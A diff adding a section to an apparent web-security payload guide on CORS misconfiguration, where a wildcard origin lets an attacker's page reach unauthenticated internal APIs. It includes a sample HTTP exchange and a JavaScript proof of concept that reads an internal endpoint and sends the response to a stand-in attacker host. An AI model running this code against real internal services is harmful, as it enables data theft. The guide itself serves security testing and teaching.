@@ -128,6 +128,41 @@ again.
 https://trusted-origin.example.com/?xss=<script>CORS-ATTACK-PAYLOAD</script>
 ```
 
+### Vulnerable Example: Wildcard Origin `*` without Credentials
+
+If the server responds with a wildcard origin `*`, the browser does never send
+the cookies. Howver, if the server does not require authentication, it's still
+possible to access the data on the server. This can happen on internal servers
+that are not accessible from the Internet. The attacker's website can then
+pivot into the internal network and access the server's data withotu
+authentication.
+
+#### Vulnerable Implementation
+
+```powershell
+GET /endpoint HTTP/1.1
+Host: api.internal.example.com
+Origin: https://evil.com
+
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: *
+
+{"[private API key]"}
+```
+
+#### Proof of concept
+
+```js
+var req = new XMLHttpRequest(); 
+req.onload = reqListener; 
+req.open('get','https://api.internal.example.com/endpoint',true); 
+req.send();
+
+function reqListener() {
+    location='//atttacker.net/log?key='+this.responseText; 
+};
+```
+
 ## Bug Bounty reports
 
 * [CORS Misconfiguration on www.zomato.com - James Kettle (albinowax)](https://hackerone.com/reports/168574)
